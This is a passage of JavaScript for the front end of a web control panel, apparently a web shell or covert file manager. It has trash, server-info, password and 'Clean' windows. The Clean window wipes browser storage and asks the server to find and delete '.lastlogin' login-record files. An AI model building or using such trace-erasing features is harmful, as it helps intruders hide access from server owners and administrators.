            } catch(e) {}
            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-notify-output');
            function print(line, cls){ var div = document.createElement('div'); if (cls) div.className = cls; div.textContent = line; output.appendChild(div); }
            function clearTrashItems(){ try { Array.prototype.slice.call(output.querySelectorAll('.trash-item')).forEach(function(n){ n.remove(); }); } catch(e){} }
            function renderTrashItems(items){
                clearTrashItems();
                if (!items || !items.length){
                    // Show a soft hint beneath header if nothing
                    var hint = document.createElement('div');
                    hint.className = 'sys trash-item';
                    hint.textContent = 'No deleted items found';
                    output.appendChild(hint);
                    return;
                }
                for (var i=0;i<items.length;i++){
                    var it = items[i];
                    var name = it && it.name ? it.name : '';
                    var type = it && it.type ? it.type : 'file';
                    var path = it && it.path ? it.path : '';
                    if (!name) continue;
                    var div = document.createElement('div');
                    div.className = 'ok trash-item';
                    div.textContent = 'trash ' + type + ' "' + name + '"' + (path ? (' (' + path + ')') : '');
                    output.appendChild(div);
                }
            }
            // Header lines with animated logo-green loading dots
            print('CODING 2.0 CMD', 'sys');
            var cmdHeader = document.createElement('div');
            cmdHeader.className = 'logo';
            cmdHeader.textContent = '$ trash --last tracer';
            var dots = document.createElement('span');
            dots.setAttribute('aria-hidden', 'true');
            cmdHeader.appendChild(dots);
            output.appendChild(cmdHeader);
            var frames = ['', '.', '..', '...'];
            var fIdx = 0;
            var dotsTimer = setInterval(function(){ try { fIdx = (fIdx + 1) % frames.length; dots.textContent = frames[fIdx]; } catch(e){} }, 500);
            try { window.addOpenApp && window.addOpenApp('trash'); } catch(e){}
            // Initial fetch and render
            async function refreshTrash(){
                try {
                    var resp = await fetch('?api=trash_recent', { credentials:'same-origin' });
                    var data = await resp.json();
                    var items = (data && data.items) ? data.items : [];
                    renderTrashItems(items);
                } catch(err) {
                    // Show error only once; subsequent refreshes keep silent to avoid spam
                    if (!output.querySelector('.err')) print('ERROR: unable to load trash', 'err');
                }
            }
            await refreshTrash();
            var refreshTimer = setInterval(refreshTrash, 5000);
            // Drag handling
            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                var r = win.getBoundingClientRect();
                dragging = true;
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!dragging) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                dx = x - (parseInt(win.style.left||'0',10)||0);
                dy = y - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!dragging) return;
                dragging = false;
                win.style.transform = '';
                var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                win.style.left = finalLeft + 'px';
                win.style.top = finalTop + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('trash.left', String(Math.round(rect.left)));
                    localStorage.setItem('trash.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }
            // Close only on click (no auto-dismiss)
            closeBtn && closeBtn.addEventListener('click', function(){
                try { clearInterval(refreshTimer); } catch(e){}
                try { clearInterval(dotsTimer); } catch(e){}
                try { window.removeOpenApp && window.removeOpenApp('trash'); } catch(e){}
                try { window.trashWin = null; } catch(e){}
                win.remove();
            });
            try { window.trashWin = win; } catch(e){}
            return win;
        }
        trashTrigger && trashTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnTrashWindow(); });

        // Clean OS popup: clear browser storage and clean server artifacts
        var cleanTrigger = document.getElementById('clean-trigger');
        var cleanTemplate = document.getElementById('clean-template');
        var cleanLayer = document.getElementById('clean-layer');
        async function spawnCleanWindow(){
            if (!cleanTemplate || !cleanLayer) return null;
            try { if (window.cleanWin && document.body.contains(window.cleanWin)) return window.cleanWin; } catch(e){}
            var win = cleanTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cleanLayer.appendChild(win);
            // Restore saved position or center initially
            try {
                var savedLeft = parseInt(localStorage.getItem('clean.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('clean.top') || '', 10);
                var cw = win.offsetWidth || 560; var ch = win.offsetHeight || 320;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px'; win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw)/2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch)/2)));
                    win.style.left = left2 + 'px'; win.style.top = top2 + 'px';
                }
            } catch(e){}
            var titlebar = win.querySelector('.clean-titlebar');
            var closeBtn = win.querySelector('.clean-close');
            var result = win.querySelector('#clean-result');
            var btnBrowser = win.querySelector('#clean-browser');
            var btnServer = win.querySelector('#clean-server');
            var btnVerify = win.querySelector('#clean-verify-ok');
            var chkTrash = win.querySelector('#chk-trash');
            var chkPassword = win.querySelector('#chk-password');
            var chkLastLogin = win.querySelector('#chk-lastlogin');
            var chkRemove = win.querySelector('#chk-remove');
            function print(msg, cls){ var d=document.createElement('div'); if(cls) d.className=cls; d.textContent=msg; result.appendChild(d); }
            function clearResult(){ try { result.innerHTML = ''; } catch(e){} }
            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                var r = win.getBoundingClientRect();
                dragging = true;
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!dragging) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                dx = x - (parseInt(win.style.left||'0',10)||0);
                dy = y - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!dragging) return;
                dragging = false;
                win.style.transform = '';
                var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                win.style.left = finalLeft + 'px';
                win.style.top = finalTop + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('clean.left', String(Math.round(rect.left)));
                    localStorage.setItem('clean.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }
            try { window.addOpenApp && window.addOpenApp('clean'); } catch(e){}
            // Clean Browser button: clear cookies, localStorage, sessionStorage, caches
            btnBrowser && btnBrowser.addEventListener('click', async function(){
                clearResult();
                try {
                    // Clear cookies (current domain)
                    var cookies = (document.cookie || '').split(';');
                    for (var i=0;i<cookies.length;i++){
                        var c = cookies[i].split('=')[0].trim();
                        if (!c) continue;
                        document.cookie = c + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
                    }
                    // Clear storages
                    try { localStorage.clear(); } catch(e){}
                    try { sessionStorage.clear(); } catch(e){}
                    // Clear caches if available
                    if (window.caches && typeof caches.keys === 'function'){
                        try {
                            var keys = await caches.keys();
                            for (var j=0;j<keys.length;j++){ try { await caches.delete(keys[j]); } catch(e){} }
                        } catch(e){}
                    }
                    print('Browser storage cleaned', 'ok');
                } catch(err) {
                    print('ERROR: failed to clean browser', 'err');
                }
            });
            // Clean Server button: send selected actions
            btnServer && btnServer.addEventListener('click', async function(){
                clearResult();
                // First, handle trash/password immediately
                var baseActs = [];
                if (chkTrash && chkTrash.checked) baseActs.push('trash');
                if (chkPassword && chkPassword.checked) baseActs.push('password');
                async function postActions(acts){
                    var payload = new URLSearchParams();
                    payload.append('api','clean_server');
                    payload.append('actions', acts.join(','));
                    var resp = await fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: payload.toString(), credentials:'same-origin' });
                    return resp.json();
                }
                // If lastlogin is requested, do a scan first
                if (chkLastLogin && chkLastLogin.checked) {
                    try {
                        var dataScan = await postActions(['lastlogin_scan']);
                        var okScan = !!(dataScan && dataScan.success);
                        var extraScan = (dataScan && dataScan.extra) ? dataScan.extra : {};
                        var foundList = Array.isArray(extraScan.lastlogin_found) ? extraScan.lastlogin_found : [];
                        var foundCount = (typeof extraScan.lastlogin_found_count === 'number') ? extraScan.lastlogin_found_count : foundList.length;
                        if (okScan) {
                            print('Found .lastlogin files (' + foundCount + '):', 'ok');
                            var limit = Math.min(foundList.length, 100);
                            for (var i=0;i<limit;i++){ print(foundList[i], 'ok'); }
                            if (foundList.length > limit) print('... and ' + (foundList.length - limit) + ' more', 'ok');
                        } else {
                            print('ERROR: scan failed', 'err');
                        }
                        // Perform cleaning only if Clear remove is checked
                        if (chkRemove && chkRemove.checked) {
                            var dataClean = await postActions(['lastlogin']);
                            var okClean = !!(dataClean && dataClean.success);
                            var extraClean = (dataClean && dataClean.extra) ? dataClean.extra : {};
                            var cleaned = Array.isArray(extraClean.lastlogin_cleaned_list) ? extraClean.lastlogin_cleaned_list : [];
                            var errs = Array.isArray(extraClean.lastlogin_errors_list) ? extraClean.lastlogin_errors_list : [];
                            if (okClean) {
                                print('Cleared .lastlogin files (' + cleaned.length + '):', 'ok');
                                var limit2 = Math.min(cleaned.length, 100);
                                for (var j=0;j<limit2;j++){ print(cleaned[j], 'ok'); }
                                if (cleaned.length > limit2) print('... and ' + (cleaned.length - limit2) + ' more', 'ok');
                                if (errs.length) {
                                    print('Errors (' + errs.length + '):', 'err');
                                    var limit3 = Math.min(errs.length, 50);
                                    for (var k=0;k<limit3;k++){ print(errs[k], 'err'); }
                                    if (errs.length > limit3) print('... and ' + (errs.length - limit3) + ' more errors', 'err');
                                }
                            } else {
                                var perf2 = (dataClean && dataClean.performed) ? dataClean.performed : [];
                                var errs2 = (dataClean && dataClean.errors) ? dataClean.errors : [];
                                print('ERROR: cleaning failed: ' + (errs2.join(', ') || 'unknown'), 'err');
                            }
                        } else {
                            print('Scan complete. Tick "Clear remove" to also remove.', 'ok');
                        }
                    } catch(err) {
                        print('ERROR: request failed', 'err');
                    }
                    // Also apply any base actions requested
                    if (baseActs.length) {
                        try {
                            var dataBase = await postActions(baseActs);
                            var perfBase = (dataBase && dataBase.performed) ? dataBase.performed : [];
                            var errsBase = (dataBase && dataBase.errors) ? dataBase.errors : [];
                            if (dataBase && dataBase.success) {
                                print('Server cleaned: ' + (perfBase.join(', ') || 'none'), 'ok');
                            } else {
                                print('ERROR: server clean failed: ' + (errsBase.join(', ') || 'unknown'), 'err');
                            }
                        } catch(e){ print('ERROR: request failed', 'err'); }
                    }
                } else {
                    // No lastlogin; just perform base actions
                    if (baseActs.length) {
                        try {
                            var dataOnly = await postActions(baseActs);
                            var perfOnly = (dataOnly && dataOnly.performed) ? dataOnly.performed : [];
                            var errsOnly = (dataOnly && dataOnly.errors) ? dataOnly.errors : [];
                            if (dataOnly && dataOnly.success) {
                                print('Server cleaned: ' + (perfOnly.join(', ') || 'none'), 'ok');
                            } else {
                                print('ERROR: server clean failed: ' + (errsOnly.join(', ') || 'unknown'), 'err');
                            }
                        } catch(e){ print('ERROR: request failed', 'err'); }
                    } else {
                        print('No actions selected', 'err');
                    }
                }
            });
            btnVerify && btnVerify.addEventListener('click', function(){
                clearResult();
                print('Clean done ✓', 'ok');
            });
            closeBtn && closeBtn.addEventListener('click', function(){
                try { window.removeOpenApp && window.removeOpenApp('clean'); } catch(e){}
                try { window.cleanWin = null; } catch(e){}
                win.remove();
            });
            try { window.cleanWin = win; } catch(e){}
            return win;
        }
        cleanTrigger && cleanTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnCleanWindow(); });

        // Settings popup
        var settingsTrigger = document.getElementById('settings-trigger');

        // Server Info popup
        var serverInfoTrigger = document.getElementById('serverinfo-trigger');
        var serverInfoTemplate = document.getElementById('serverinfo-template');
        var serverInfoLayer = document.getElementById('serverinfo-layer');
        function spawnServerInfoWindow(){
            if (!serverInfoTemplate || !serverInfoLayer) return null;
            try { if (window.serverInfoWin && document.body.contains(window.serverInfoWin)) return window.serverInfoWin; } catch(e){}
            var win = serverInfoTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            serverInfoLayer.appendChild(win);
            // Restore saved size (width/height)
            try {
                var savedWidth = parseInt(localStorage.getItem('serverinfo.width') || '', 10);
                var savedHeight = parseInt(localStorage.getItem('serverinfo.height') || '', 10);
                if (!isNaN(savedWidth)) {
                    var minW = 360; var maxW = Math.floor(window.innerWidth * 0.92);
                    win.style.width = Math.max(minW, Math.min(maxW, savedWidth)) + 'px';
                }
                if (!isNaN(savedHeight)) {
                    var minH = 160; var maxH = Math.floor(window.innerHeight * 0.92);
                    win.style.height = Math.max(minH, Math.min(maxH, savedHeight)) + 'px';
                }
            } catch(e){}
            // Position
            try {
                var savedLeft = parseInt(localStorage.getItem('serverinfo.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('serverinfo.top') || '', 10);
                var cw = win.offsetWidth || 560; var ch = win.offsetHeight || 360;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px'; win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw)/2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch)/2)));
                    win.style.left = left2 + 'px'; win.style.top = top2 + 'px';
                }
            } catch(e){}
            var titlebar = win.querySelector('.serverinfo-titlebar');
            var closeBtn = win.querySelector('.serverinfo-close');
            var closeActionBtn = win.querySelector('#serverinfo-close-btn');
            // Drag
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){
                drag.active = false; document.removeEventListener('mousemove', onMouseMove); document.removeEventListener('mouseup', onMouseUp);
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('serverinfo.left', String(Math.round(rect.left)));
                    localStorage.setItem('serverinfo.top', String(Math.round(rect.top)));
                    localStorage.setItem('serverinfo.width', String(Math.round(win.offsetWidth)));
                    localStorage.setItem('serverinfo.height', String(Math.round(win.offsetHeight)));
                } catch(e){}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            // Persist size whenever the window is resized
            try {
                if ('ResizeObserver' in window) {
                    var ro = new ResizeObserver(function(){
                        try {
                            localStorage.setItem('serverinfo.width', String(Math.round(win.offsetWidth)));
                            localStorage.setItem('serverinfo.height', String(Math.round(win.offsetHeight)));
                        } catch(e){}
                    });
                    ro.observe(win);
                }
            } catch(e){}
            // Close
            function doClose(){ try { window.serverInfoWin = null; } catch(e){} win.remove(); }
            closeBtn && closeBtn.addEventListener('click', doClose);
            closeActionBtn && closeActionBtn.addEventListener('click', doClose);
            // Copy buttons inside Server Info
            try {
                var copyButtons = win.querySelectorAll('.copy-btn');
                copyButtons && copyButtons.forEach(function(btn){
                    btn.addEventListener('click', function(){
                        try {
                            var sel = btn.getAttribute('data-copy-target');
                            var target = sel ? win.querySelector(sel) : null;
                            var full = target ? (target.getAttribute('data-full') || target.textContent || '') : '';
                            if (!full) return;
                            if (navigator.clipboard && navigator.clipboard.writeText) {
                                navigator.clipboard.writeText(full).then(function(){
                                    btn.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">check_circle</span><span>Copied</span>';
                                    setTimeout(function(){ btn.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">content_copy</span><span>Copy</span>'; }, 1400);
                                });
                            } else {
                                var ta = document.createElement('textarea');
                                ta.value = full;
                                document.body.appendChild(ta);
                                ta.select();
                                try { document.execCommand('copy'); } catch(e){}
                                document.body.removeChild(ta);
                                btn.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">check_circle</span><span>Copied</span>';
                                setTimeout(function(){ btn.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">content_copy</span><span>Copy</span>'; }, 1400);
                            }
                        } catch(e){}
                    });
                });
                // Minimal copy icon buttons
                var copyIcons = win.querySelectorAll('.copy-icon');
                copyIcons && copyIcons.forEach(function(icon){
                    icon.addEventListener('click', function(){
                        try {
                            var sel = icon.getAttribute('data-copy-target');
                            var target = sel ? win.querySelector(sel) : null;
                            var full = target ? (target.getAttribute('data-full') || target.textContent || '') : '';
                            if (!full) return;
                            var mark = function(){
                                try { icon.classList.add('copied'); icon.setAttribute('title', 'Copied'); setTimeout(function(){ icon.classList.remove('copied'); icon.setAttribute('title', 'Copy'); }, 1200); } catch(e){}
                            };
                            if (navigator.clipboard && navigator.clipboard.writeText) {
                                navigator.clipboard.writeText(full).then(mark);
                            } else {
                                var ta = document.createElement('textarea');
                                ta.value = full;
                                document.body.appendChild(ta);
                                ta.select();
                                try { document.execCommand('copy'); } catch(e){}
                                document.body.removeChild(ta);
                                mark();
                            }
                        } catch(e){}
                    });
                });
            } catch(e){}
            // Click-to-copy for truncated text targets (e.g., Uname)
            try {
                var copyTargets = win.querySelectorAll('.copyable');
                function performCopy(el){
                    var full = el ? (el.getAttribute('data-full') || el.textContent || '') : '';
                    if (!full) return;
                    var markCopied = function(){
                        try {
                            el.classList.add('copied');
                            var oldTitle = el.getAttribute('title') || '';
                            el.setAttribute('data-old-title', oldTitle);
                            el.setAttribute('title', 'Copied');
                            setTimeout(function(){
                                el.classList.remove('copied');
                                var restore = el.getAttribute('data-old-title');
                                if (restore !== null) el.setAttribute('title', restore);
                                el.removeAttribute('data-old-title');
                            }, 1200);
                        } catch(e){}
                    };
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        navigator.clipboard.writeText(full).then(markCopied);
                    } else {
                        var ta = document.createElement('textarea');
                        ta.value = full;
                        document.body.appendChild(ta);
                        ta.select();
                        try { document.execCommand('copy'); } catch(e){}
                        document.body.removeChild(ta);
                        markCopied();
                    }
                }
                copyTargets && copyTargets.forEach(function(el){
                    el.addEventListener('click', function(){ performCopy(el); });
                    el.addEventListener('keydown', function(e){ if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); performCopy(el); } });
                });
            } catch(e){}
            try { window.serverInfoWin = win; } catch(e){}
            return win;
        }
        serverInfoTrigger && serverInfoTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnServerInfoWindow(); });
        try { window.spawnServerInfoWindow = spawnServerInfoWindow; } catch(e){}
        var settingsTemplate = document.getElementById('settings-template');
        var settingsLayer = document.getElementById('settings-layer');
        var confirmTemplate = document.getElementById('confirm-template');
        var confirmLayer = document.getElementById('confirm-layer');
        function spawnConfirmWindow(opts){
            // opts: { message: string, onYes: function, onNo?: function, anchor?: HTMLElement }
            if (!confirmTemplate || !confirmLayer) return null;
            var win = confirmTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            confirmLayer.appendChild(win);
            try {
                var anchor = opts && opts.anchor;
                var rect = anchor && anchor.getBoundingClientRect ? anchor.getBoundingClientRect() : null;
                var ww = win.offsetWidth || 320;
                var wh = win.offsetHeight || 120;
                if (rect) {
                    var left = Math.round(rect.left + (rect.width/2) - (ww/2));
                    var top = Math.round(rect.top - wh - 10);
                    // Clamp into viewport and if too high, place below button
                    if (top < 8) top = Math.round(rect.bottom + 10);
                    var maxLeft = window.innerWidth - ww - 8;
                    if (left < 8) left = 8;
                    if (left > maxLeft) left = maxLeft;
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    // Fallback to center if no anchor
                    try { centerWindow(win); } catch(e){}
                }
            } catch(e){}
            var closeBtn = win.querySelector('.confirm-close');
            var msgEl = win.querySelector('.confirm-message');
            var yesBtn = win.querySelector('.confirm-yes');
            var noBtn = win.querySelector('.confirm-no');
            if (msgEl && opts && typeof opts.message === 'string') { msgEl.textContent = opts.message; }
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            noBtn && noBtn.addEventListener('click', function(){ try { if (opts && typeof opts.onNo === 'function') opts.onNo(); } catch(e){} win.remove(); });
            yesBtn && yesBtn.addEventListener('click', function(){ try { if (opts && typeof opts.onYes === 'function') opts.onYes(); } catch(e){} win.remove(); });
            return win;
        }
        try { window.spawnConfirmWindow = spawnConfirmWindow; } catch(e){}
        function randomPassword(len){
            var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:,.<>?';
            var out = '';
            for (var i=0;i<len;i++){ out += chars[Math.floor(Math.random()*chars.length)]; }
            return out;
        }
        function spawnSettingsWindow(){
            if (!settingsTemplate || !settingsLayer) return null;
            var win = settingsTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            settingsLayer.appendChild(win);
            try { window.addOpenApp && window.addOpenApp('settings'); } catch(e){}
            // Terminal-style toast helper
            function showTermToast(msg, isError){
                try {
                    var t = document.createElement('div');
                    t.className = 'term-toast' + (isError ? ' error' : '');
                    t.innerHTML = '<span class="prompt">$</span><span class="msg"></span><span class="cursor">_</span>';
                    t.querySelector('.msg').textContent = msg;
                    document.body.appendChild(t);
                    // Force reflow for transition then show
                    void t.offsetWidth; t.classList.add('show');
                    setTimeout(function(){ t.classList.remove('show'); setTimeout(function(){ t.remove(); }, 200); }, 2600);
                } catch(e) {}
            }
            // Restore saved position or center window initially
            try {
                var savedLeft = parseInt(localStorage.getItem('settings.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('settings.top') || '', 10);
                var sw = win.offsetWidth || 560;
                var sh = win.offsetHeight || 320;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - sw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - sh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - sw - 6, Math.round((window.innerWidth - sw) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - sh - 6, Math.round((window.innerHeight - sh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            var titlebar = win.querySelector('.settings-titlebar');
            var closeBtn = win.querySelector('.settings-close');
            var inputCurrent = win.querySelector('#set-current');
            var inputNew = win.querySelector('#set-new');
            var inputConfirm = win.querySelector('#set-confirm');
            var btnGen = win.querySelector('#set-generate');
            var btnCopy = win.querySelector('#set-copy');
            var btnSave = win.querySelector('#set-save');
            var toggleCur = win.querySelector('#set-cur-toggle');
            var toggleNew = win.querySelector('#set-new-toggle');
            var toggleConf = win.querySelector('#set-conf-toggle');
            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                var r = win.getBoundingClientRect();
                dragging = true;
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                document.body.style.userSelect='none';
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if(!dragging) return;
                var left = (e.clientX||0) - offX; var top = (e.clientY||0) - offY;
                var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8;
                if (left<8) left=8; if (top<8) top=8; if (left>maxLeft) left=maxLeft; if (top>maxTop) top=maxTop;
                dx = left - (parseInt(win.style.left||'0',10)||0);
                dy = top - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if(!dragging) return;
                dragging=false;
                win.style.transform = '';
                document.body.style.userSelect='';
                var left = Math.max(8, Math.min(window.innerWidth - win.offsetWidth - 8, (e.clientX||0) - offX));
                var top = Math.max(8, Math.min(window.innerHeight - win.offsetHeight - 8, (e.clientY||0) - offY));
                win.style.left = left+'px'; win.style.top = top+'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('settings.left', String(Math.round(rect.left)));
                    localStorage.setItem('settings.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { window.removeOpenApp && window.removeOpenApp('settings'); } catch(e){}
            });
            btnGen && btnGen.addEventListener('click', function(){ var p = randomPassword(16); inputNew && (inputNew.value = p); inputConfirm && (inputConfirm.value = p); });
            btnCopy && btnCopy.addEventListener('click', function(){ var val = (inputNew && inputNew.value) || ''; if (!val) return; navigator.clipboard && navigator.clipboard.writeText(val).catch(function(){}); });
            btnSave && btnSave.addEventListener('click', function(){
                var curr = (inputCurrent && inputCurrent.value) || '';
                var neu = (inputNew && inputNew.value) || '';
                var conf = (inputConfirm && inputConfirm.value) || '';
                // Show confirmation popup before submitting
                spawnConfirmWindow({
                    message: 'Are you sure you want to change password?',
                    anchor: btnSave,
                    onYes: function(){
                        var body = 'api=set_password&current=' + encodeURIComponent(curr) + '&new=' + encodeURIComponent(neu) + '&confirm=' + encodeURIComponent(conf);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body })
                            .then(function(r){ return r.json().catch(function(){ return { success:false, error:'Invalid response' }; }); })
                            .then(function(j){
                                if (j && j.success){
                                    try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Password updated successfully', false); } catch(e){}
                                    // Close settings popup and ensure it does not auto-reopen
                                    try { window.removeOpenApp && window.removeOpenApp('settings'); } catch(e){}
                                    try { win && win.remove(); } catch(e){}
                                    // If server signaled logout, redirect to login (same page)
                                    if (j.logout){
                                        var msg = encodeURIComponent('Password updated. Please log in again.');
                                        window.location.href = window.location.pathname + '?n=' + msg;
                                        return;
                                    }
                                    // Fallback: reload page to refresh session state
                                    setTimeout(function(){ try { window.location.reload(); } catch(e){} }, 600);
                                } else {
                                    try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify((j && j.error) || 'Failed to update password', true); } catch(e){}
                                }
                            })
                            .catch(function(){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Network error', true); } catch(e){} });
                    },
                    onNo: function(){
                        try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Password change canceled', true); } catch(e){}
                    }
                });
            });
            // Show/Hide password toggles
            function wireToggle(btn, input){
                if (!btn || !input) return;
                var icon = btn.querySelector('.material-symbols-rounded');
                function sync(){
                    if (input.type === 'password'){
                        if (icon) icon.textContent = 'visibility';
                        btn.setAttribute('aria-label','Show');
                        btn.setAttribute('title','Show');
                    } else {
                        if (icon) icon.textContent = 'visibility_off';
                        btn.setAttribute('aria-label','Hide');
                        btn.setAttribute('title','Hide');
                    }
                }
                btn.addEventListener('click', function(){
                    input.type = (input.type === 'password') ? 'text' : 'password';
                    sync();
                    try {
                        input.focus();
                        var len = input.value.length;
                        input.setSelectionRange && input.setSelectionRange(len, len);
                    } catch(e) {}
                });
                sync();
            }
            wireToggle(toggleCur, inputCurrent);
            wireToggle(toggleNew, inputNew);
            wireToggle(toggleConf, inputConfirm);
            return win;
        }
        // Expose for dock handlers outside this scope
        try { window.spawnSettingsWindow = spawnSettingsWindow; } catch(e){}
